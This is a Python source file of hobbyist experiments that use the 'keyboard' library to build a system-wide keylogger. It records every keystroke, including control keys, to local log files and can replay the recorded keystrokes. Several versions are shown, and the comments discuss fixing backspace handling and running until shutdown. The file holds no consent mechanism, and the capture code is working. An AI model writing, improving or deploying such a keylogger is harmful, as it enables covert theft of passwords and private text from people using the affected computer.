from multiprocessing.managers import BaseManager
from xml.dom.domreg import well_known_implementations
import keyboard
import time
import os
import json

def print_to_log(c:str,file_name="log.logfile"):
    with open(file_name,"a",encoding='utf-8') as f:
        f.write(c)

def remove_last_char(file_name="log.logfile"):
    with open(file_name,"rb+") as f:
        f.seek(-1,os.SEEK_END)
        f.truncate()
chars = "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","1","2","3","4","5","6","7","8","9","0","comma","dot","colon","semicolon","space","shift","enter","backspace"
def try_1():
    for c in chars:
        keyboard.add_hotkey(c,print_to_log,args=(c,))
    while 1:
        time.sleep(0.1)

def try_2():
    for c in chars:
        keyboard.hook_key(c,print_to_log)
        while 1: time.sleep(0.1)

def try_3():
    #first one that actually works well
    #problem: no control characters are logged and backspaces don't work in 
    #between the five seconds but honestly you can just change the 5 to another
    #number that is not too large to never be over before system shuts down
    #but not too short that backspaces go missing or smthg :)
    while True:
        keyboard.start_recording()
        time.sleep(5)
        events = keyboard.stop_recording()
        for s in keyboard.get_typed_strings(events,allow_backspace=True):
            print_to_log(s)

def try_4():
    #every key input is logged so it is a completely fine program now.
    #its just not that readable and that could definitely be improved i guess
    #like there should be a mode where only the text that is produced is logged
    #just like in try_3 but without the backspace issue i guess
    while True:
        keyboard.start_recording()
        time.sleep(5)
        events = keyboard.stop_recording()
        for e in events:
            if len(e.name) > 1:
                print_to_log("[{}:{}]".format(e.name,e.event_type))
            else:
                if e.event_type == "down":
                    print(e.to_json())
                    print_to_log(e.name)
                
def try_5():
#does the same as try_3 but there is no backspace issue at least for windows
#anyways it is the same as the bodule function but better suited
    log_file = "simple.logfile"
    while True:
        keyboard.start_recording()
        time.sleep(5)
        events = keyboard.stop_recording()
        for e in events:
            if e.event_type == "up": continue

            if len(e.name) > 1:
                if e.name == 'backspace':
                    remove_last_char(log_file)
                if e.name == "space":
                    print_to_log(" ",file_name=log_file)
                if e.name == "enter":
                    print_to_log("\n",file_name=log_file)
                if e.name == "tab":
                    print_to_log("\t",file_name=log_file)
            else:
                print_to_log(e.name,file_name=log_file)

stop = False
def try_6():
    global stop
    #stores all events without processing them
    #gives the option to reenact all the events back
    log_file = "complex.logfile"
    start_time = None
    import signal
    while not stop:
        keyboard.start_recording()
        for i in range(50):
            try:
                time.sleep(0.1)
            except KeyboardInterrupt:
                stop = True
                break
        events = keyboard.stop_recording()
        for e in events:
            if start_time is None:
                start_time = e.time
            print(e.to_json())
            e_type = int(e.event_type=="up") #up is 1 ;down is 0
            s = e.scan_code
            n = e.name
            t = float((e.time - start_time).__format__(".2f"))
            if not t: t = float(e.time.__format__(".2f"))
            k = int(e.is_keypad)
            j = {"e":e_type,"s":s,"n":n,"t":t,'k':k}
            print_to_log(json.dumps(j)+"\n",log_file)
        

def try_6_2():
    #this reads the events stored in try_6 to play them out
    time.sleep(2)
    log_file = "complex.logfile"
    k_events = []
    time_offset = 0
    with open(log_file,'r') as f:
        for line in f:
            d = json.loads(line)
            e = ("down","up")[int(d['e'])]
            s = d['s']
            n = d['n']
            t = d['t'] + time_offset
            if d['t'] > 1643972868:
                time_offset = d['t']
                t = d['t']
            k = bool(d['k'])
            k_events += [keyboard.KeyboardEvent(event_type=e,scan_code=s,name=n,time=t,is_keypad=k)]
    for e in k_events:
        print(e.to_json())
    keyboard._os_keyboard.init()
    keyboard.play(k_events,speed_factor=3)

        
print(keyboard.key_to_scan_codes("linke windows"))  #weird this doesnt work ?

try_6()